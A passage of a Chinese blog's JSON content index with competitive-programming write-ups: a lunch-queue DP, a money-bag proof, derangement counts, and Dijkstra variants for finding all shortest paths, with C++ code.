class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> x = MAX(dp[i<span class=\"number\">-1</span>][j-man[i].a][k], j+man[i].b);</span><br><span class=\"line\"><span class=\"keyword\">int</span> y = MAX(dp[i<span class=\"number\">-1</span>][j][k-man[i].a], k+man[i].b);</span><br><span class=\"line\">dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX</p>\n</li>\n<li><p>因为无需枚举<code>k</code> ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组</p>\n</li>\n</ul>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cassert&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;map&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> FWD(x, b, e) for (int x = b; x &lt; e; x++)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> BWD(x, b, e) for (int x = b; x &gt;= e; x--)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> INF 0x3f3f3f3f</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">int</span> <span class=\"title\">MAX</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123; <span class=\"keyword\">return</span> x &lt; y ? y : x; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">int</span> <span class=\"title\">MIN</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123; <span class=\"keyword\">return</span> x &lt; y ? x : y; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> a, b;<span class=\"comment\">// a is pick time, b is eat time</span></span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Node &amp;y) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>-&gt;b &gt; y.b; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Node man[<span class=\"number\">300</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> dp[<span class=\"number\">80010</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> sum[<span class=\"number\">300</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;man[i].a, &amp;man[i].b);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(man, man + n);</span><br><span class=\"line\"></span><br><span class=\"line\">    sum[<span class=\"number\">0</span>] = man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">1</span>, n) &#123; sum[i] = sum[i - <span class=\"number\">1</span>] + man[i].a; &#125;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dp, <span class=\"number\">10</span>, <span class=\"keyword\">sizeof</span>(dp));</span><br><span class=\"line\">    dp[<span class=\"number\">0</span>] = man[<span class=\"number\">0</span>].b + man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    dp[man[<span class=\"number\">0</span>].a] = man[<span class=\"number\">0</span>].b + man[<span class=\"number\">0</span>].a;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">1</span>, n) &#123;</span><br><span class=\"line\">        BWD(j, sum[i], <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> tmp1 = INF, tmp2 = INF;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                tmp1 = MAX(dp[j - man[i].a], j + man[i].b);<span class=\"comment\">// 第一个人放在1队</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                tmp2 = MAX(dp[j], sum[i] - j + man[i].b);<span class=\"comment\">// 第i个人放在二队</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 如果j只能允许man[i].a放在一队，则i就放一队</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &lt; man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = tmp1;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (j &lt; man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = tmp2;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class=\"line\">                dp[j] = MIN(tmp2, tmp1);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ans = INF;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">0</span>, sum[n - <span class=\"number\">1</span>] + <span class=\"number\">1</span>) &#123; ans = ans &lt; dp[i] ? ans : dp[i]; &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>注意，在枚举$dp[i][j]$ 的<code>j</code> 时，要注意该<code>j</code> 是否允许<code>man[i].a</code> 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN</p>\n</li>\n<li><p>注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j&lt;man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j&lt;man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。</p>\n</li>\n<li><p>此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归</p>\n<img src=\"/2018/05/20/洛谷2577-午餐/1.png\">\n</li>\n<li><p><a href=\"https://www.luogu.org/problemnew/solution/P2577\" target=\"_blank\" rel=\"noopener\">截图来源 </a></p>\n</li>\n</ul>\n","slug":"洛谷2577-午餐","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"动态规划","slug":"动态规划","permalink":"https://h-zex.github.io/tags/动态规划/"}]},{"title":"洛谷2320 鬼谷子的钱袋 形式化证明","date":"2018-05-16T17:33:21.000Z","path":"2018/05/17/洛谷2320-鬼谷子的钱袋-形式化证明/","text":"题目描述鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。 有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。 但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。 鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？ 输入输出格式 输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。 输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开 输入输出示例12345输入3输出21 2 解法 对于m个待装袋的金币，取$\\lceil m/2\\rceil$ 个金币装入第一个袋子，然后递归求解 证明 对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子 按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ 对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$ 所以我们的解法已经达到了最优","raw":"---\ntitle: 洛谷2320 鬼谷子的钱袋 形式化证明\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-17 01:33:21\ntags:\n- ACM\n- 数学\n- 递归\ndescription: 题解\ncategories:\n- 算法\n\n---\n\n## 题目\n\n#### 描述\n\n鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。\n\n有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。\n\n但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。\n\n鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？\n\n\n#### 输入输出格式\n\n- 输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。\n\n- 输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开\n\n\n#### 输入输出示例\n\n```\n输入\n3\n输出\n2\n1 2\n```\n\n## 解法\n\n- 对于m个待装袋的金币，取$\\lceil m/2\\rceil$ 个金币装入第一个袋子，然后递归求解\n\n## 证明\n\n- 对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子\n- 按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ \n- 对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$\n- 所以我们的解法已经达到了最优\n","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><h4 id=\"描述\"><a href=\"#描述\" class=\"headerlink\" title=\"描述\"></a>描述</h4><p>鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。</p>\n<p>有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。</p>\n<p>但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。</p>\n<p>鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？</p>\n<h4 id=\"输入输出格式\"><a href=\"#输入输出格式\" class=\"headerlink\" title=\"输入输出格式\"></a>输入输出格式</h4><ul>\n<li><p>输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。</p>\n</li>\n<li><p>输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开</p>\n</li>\n</ul>\n<h4 id=\"输入输出示例\"><a href=\"#输入输出示例\" class=\"headerlink\" title=\"输入输出示例\"></a>输入输出示例</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入</span><br><span class=\"line\">3</span><br><span class=\"line\">输出</span><br><span class=\"line\">2</span><br><span class=\"line\">1 2</span><br></pre></td></tr></table></figure>\n<h2 id=\"解法\"><a href=\"#解法\" class=\"headerlink\" title=\"解法\"></a>解法</h2><ul>\n<li>对于m个待装袋的金币，取$\\lceil m/2\\rceil$ 个金币装入第一个袋子，然后递归求解</li>\n</ul>\n<h2 id=\"证明\"><a href=\"#证明\" class=\"headerlink\" title=\"证明\"></a>证明</h2><ul>\n<li>对于一个数m，采用每次分割一半的方法，共分割出$\\lfloor lg_2m\\rfloor+1$ 个袋子</li>\n<li>按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\\geq \\lceil lg_2(m+1)\\rceil$ </li>\n<li>对于$m\\geq1$，$\\lceil lg_2(m+1)\\rceil= \\lfloor lg_2m\\rfloor+1$</li>\n<li>所以我们的解法已经达到了最优</li>\n</ul>\n","slug":"洛谷2320-鬼谷子的钱袋-形式化证明","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/tags/数学/"},{"name":"递归","slug":"递归","permalink":"https://h-zex.github.io/tags/递归/"}]},{"title":"组合数之错排数","date":"2018-05-14T13:51:56.000Z","path":"2018/05/14/组合数之错排数/","text":"错排数的定义 假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能 递推公式 设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ 解释如下 假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能 假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能 为什么没有其他可能？ 因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况 ACM题 hdu2049","raw":"---\ntitle: 组合数之错排数\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-14 21:51:56\ntags:\n- 组合数\n- 错排\n- ACM\ndescription: n个元素都不在自己的位置上，有多少种可能\ncategories:\n- 数学\n\n---\n\n## 错排数的定义\n\n- 假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能\n\n## 递推公式\n\n- 设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ \n- 解释如下\n  - 假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能\n  - 假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能\n- 为什么没有其他可能？\n  - 因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况\n\n## ACM题\n\n- hdu2049","content":"<h2 id=\"错排数的定义\"><a href=\"#错排数的定义\" class=\"headerlink\" title=\"错排数的定义\"></a>错排数的定义</h2><ul>\n<li>假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能</li>\n</ul>\n<h2 id=\"递推公式\"><a href=\"#递推公式\" class=\"headerlink\" title=\"递推公式\"></a>递推公式</h2><ul>\n<li>设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ </li>\n<li>解释如下<ul>\n<li>假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能</li>\n<li>假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能</li>\n</ul>\n</li>\n<li>为什么没有其他可能？<ul>\n<li>因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\\neq i$ ，没有其他可能情况</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"ACM题\"><a href=\"#ACM题\" class=\"headerlink\" title=\"ACM题\"></a>ACM题</h2><ul>\n<li>hdu2049</li>\n</ul>\n","slug":"组合数之错排数","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"组合数","slug":"组合数","permalink":"https://h-zex.github.io/tags/组合数/"},{"name":"错排","slug":"错排","permalink":"https://h-zex.github.io/tags/错排/"}]},{"title":"天梯L3 007 天梯地图","date":"2018-05-13T07:10:04.000Z","path":"2018/05/13/天梯L3-007-天梯地图/","text":"题目 输入示例一123456789101112131415161710 150 1 0 1 18 0 0 1 14 8 1 1 15 4 0 2 35 9 1 1 40 6 0 1 17 3 1 1 28 3 1 1 22 5 0 2 22 1 1 1 11 5 0 1 31 4 0 1 19 7 1 1 33 1 0 2 56 3 1 2 15 3 输出示例一12Time = 6: 5 =&gt; 4 =&gt; 8 =&gt; 3Distance = 3: 5 =&gt; 1 =&gt; 3 输入示例二12345678910117 90 4 1 1 11 6 1 3 12 6 1 1 12 5 1 2 23 0 0 1 13 1 1 3 13 2 1 2 14 5 0 2 26 5 1 2 13 5 输出示例二1Time = 3; Distance = 4: 3 =&gt; 2 =&gt; 5 Dijstra算法 bfs+优先队列其实就是dijstra算法 dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ Dijstra找出所有最短路径 从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。 具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如vector&lt;int&gt; parent[600] ，则parent[n] 代表的vector就是编号为n的节点的parent list 然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。 需要注意的点不可以这样寻找同代价的不同parent 节点 代码 12345678910111213141516// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价// 其实edge t就代表了节点mestruct Edge_t &#123; int me; int p; int t; Edge_t(int m, int h, int y) : me(m), p(h), t(y) &#123;&#125; bool operator&lt;(const Edge_t &amp;x) const &#123; return x.t &lt; this-&gt;t; &#125;&#125;;while (!que.empty()) &#123; Edge_t t = que.top(); que.pop(); while (!que.empty() &amp;&amp; que.top().t == t.t &amp;&amp; que.top().me == t.me) ...&#125; 可能某Edge h 确实跟pop出来的Edge t是代表的是同一个节点——也就是h.me==t.me ，并且代价相同。但是在堆中，还有同等代价的Edge p，其终点不是t.me ——也就是p.me!=t.me ，然后该Edge p 在堆中的位置处在Edge h 前面，所以上面那个while就没办法获得Edge h 从而无法获取完整的parent list。 另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出Edge t 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里 考虑自循环边 直接判断要求某点A邻接的点不与A相同即可实现 因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意 dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法 INF的取值要注意 dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得INF+weight[i]不再是INF 自己生成数据对拍时 要注意不要生成多重边，网上很多ac的代码都是不支持多重边的 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define INF 0x3f3f3f3fusing namespace std;struct Node &#123; int index; vector&lt;int&gt; adj;&#125;;Node v[600];int length[600][600]; // length[i][j]记录从node i到node j的lengthint TIME[600][600]; // TIME[i][j]记录从node i到node j的用时vector&lt;int&gt; tp[600];// node's parent listint tpResult[600];// 最终的node的parentint BEGIN, END; // 题目输入的天梯队员的起点和要到达的终点int vertexCnt, edgeCnt;int dijstra(int weight[][600]);int DFS(bool isLength);void outp(int f, int index);int main(int argc, char** argv) &#123; int n, m; while (~scanf(\"%d%d\", &amp;n, &amp;m)) &#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; TIME[i][j] = INF; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; length[i][j] = INF; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; v[i].index = i; v[i].adj.clear(); &#125; for (int i = 0; i &lt; n; i++) &#123; tp[i].clear(); &#125; vertexCnt = n, edgeCnt = m; int v1, v2, one, l, t; for (int i = 0; i &lt; m; i++) &#123; scanf(\"%d%d%d%d%d\", &amp;v1, &amp;v2, &amp;one, &amp;l, &amp;t); v[v1].adj.push_back(v2); // 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可 length[v1][v2] = length[v1][v2] &lt; l ? length[v1][v2] : l; TIME[v1][v2] = TIME[v1][v2] &lt; t ? TIME[v1][v2] : t; if (!one) &#123; v[v2].adj.push_back(v1); length[v2][v1] = length[v2][v1] &lt; l ? length[v2][v1] : l; TIME[v2][v1] = TIME[v2][v1] &lt; t ? TIME[v2][v1] : t; &#125; &#125; scanf(\"%d%d\", &amp;BEGIN, &amp;END); if (BEGIN == END) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; \"0\" &lt;&lt; \"; Distance = \" &lt;&lt; \"0\" &lt;&lt; \": \"; cout &lt;&lt; BEGIN &lt;&lt; \" =&gt; \" &lt;&lt; END &lt;&lt; endl; continue; &#125; if (n == 2) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; TIME[BEGIN][END] &lt;&lt; \"; Distance = \" &lt;&lt; length[BEGIN][END] &lt;&lt; \": \"; cout &lt;&lt; BEGIN &lt;&lt; \" =&gt; \" &lt;&lt; END &lt;&lt; endl; continue; &#125; int timeEND = dijstra(TIME);// outp(END, 0); DFS(false); vector&lt;int&gt; r1, r2; r1.push_back(END); // 以下这种构造路径的方式是建立在起点不同于终点的情况下 int tmp_tp = tpResult[END]; r1.push_back(tmp_tp); while (tmp_tp != BEGIN) &#123; tmp_tp = tpResult[tmp_tp]; r1.push_back(tmp_tp); &#125; reverse(r1.begin(), r1.end()); for (int i = 0; i &lt; n; i++) &#123; tp[i].clear(); &#125; int lenEND = dijstra(length);// outp(END, 0); DFS(true); r2.push_back(END); tmp_tp = tpResult[END]; r2.push_back(tmp_tp); while (tmp_tp != BEGIN) &#123; tmp_tp = tpResult[tmp_tp]; r2.push_back(tmp_tp); &#125; reverse(r2.begin(), r2.end()); bool isSame = false; if (r1.size() == r2.size()) &#123; isSame = true; for (int i = 0; i &lt; r1.size(); i++) &#123; isSame = (r1[i] == r2[i]) &amp;&amp; isSame; &#125; &#125; if (isSame) &#123; cout &lt;&lt; \"Time = \" &lt;&lt; timeEND &lt;&lt; \"; Distance = \" &lt;&lt; lenEND &lt;&lt; \": \"; for (int i = 0; i &lt; r1.size() - 1; i++) &#123; cout &lt;&lt; r1[i] &lt;&lt; \" =&gt; \"; &#125; cout &lt;&lt; r1[r1.size() - 1] &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"Time = \" &lt;&lt; timeEND &lt;&lt; \": \"; for (int i = 0; i &lt; r1.size() - 1; i++) &#123; 